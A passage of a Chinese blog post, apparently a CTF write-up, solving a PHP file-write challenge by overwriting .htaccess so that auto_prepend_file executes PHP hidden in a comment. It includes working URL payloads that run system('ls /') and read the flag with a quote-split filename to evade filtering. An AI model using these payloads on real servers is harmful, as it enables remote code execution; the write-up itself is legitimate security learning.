+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>源码如上，发现它会用<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-unlink.html">unlink</a>删除了当前目录下除了index.php以外的文件，一开始我以为没有啥影响，就照做下去了，可是后来才发现这是卡住自己的地方。这道题对于传入的content用<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-strstr.html">stristr</a>对传入的文件进行了截取。然后对传入的filename进行了过滤，即无法传入除了小写字母和” . “构成外的参数。经过之前的毒打，理解了<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contents</a>是将第二个参数写入第一个参数的文件中，我就构造了payload：?content&#x3D;&lt;?php system(“ls”);?&gt;&amp;filename&#x3D;flag.php，当我访问了flag.php后发现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309121705908.png"></p>
+<p>这个文件没有进行PHP解析，无法执行，<strong>也许</strong>因为前面删除文件的作用，删除了.htaccess文件吧，只能继续学知识了。</p>
+<blockquote>
+<p>处理方法：重新写入.htaccess关于解析php代码的内容(让所有的 PHP 文件【index.php】都包含 .htaccess 文件自身,在.htaccess后面写入PHP代码执行)</p>
+<p>​		先了解<code>.htaccess</code> 中使用<code>#</code> 进行单行注释，php_value auto_append_file会自动包含并解析文件</p>
+<p>​		最后就是利用.htaccess写shell，将一句话写入到.htaccess的注释中，再利用它自动加载文件的特性加载.htaccess文件，从而加载一句话。如：在<code>.htaccess</code> 中使用<code>php_value auto_prepend_file .htaccess#&lt;?php system(&quot;ls&quot;);?&gt;</code> 在脚本头部加载一句话（剩下还需要绕过file和添加\转义content后\n的\）</p>
+<p>所以payload：</p>
+<p>查看：?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil%0ae%20.htaccess%0a%23<?
+php%20system("ls /");?>\	&#x2F;&#x2F;发现flag，后面就可以绕过flag字符获取flag了</p>
+<p>获取：?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil%0ae%20.htaccess%0a%23<?
+php%20system("cat /fla''g");?>\</p>
+</blockquote>
+<p>可是最后还是不懂为什么file中需要使用一个换行，试过删除则无用的payload</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1824057">.htaccess的姿势</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Buff/">
+                                    <span class="chip bg-color">Buff</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/06/04/Tool/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="工具利用">
+                        
+                        <span class="card-title">工具利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-04
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B7%A5%E5%85%B7%E9%9B%86/" class="post-category">
+                                    工具集
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/06/03/ctf_show-web/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/medias/featureimages/2.jpg" class="responsive-img" alt="web基础">
+                        
+                        <span class="card-title">web基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%A2%98%E7%9B%AE%E9%9B%86/" class="post-category">
+                                    题目集
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf-show/">
+                        <span class="chip bg-color">ctf_show</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="8441507056"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <span id="year">2023</span>
+            <a href="/about" target="_blank">Ntrack</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">22.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2023";
+                    var startMonth = "5";
+                    var startDate = "27";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/NTrack" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:ntrack@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
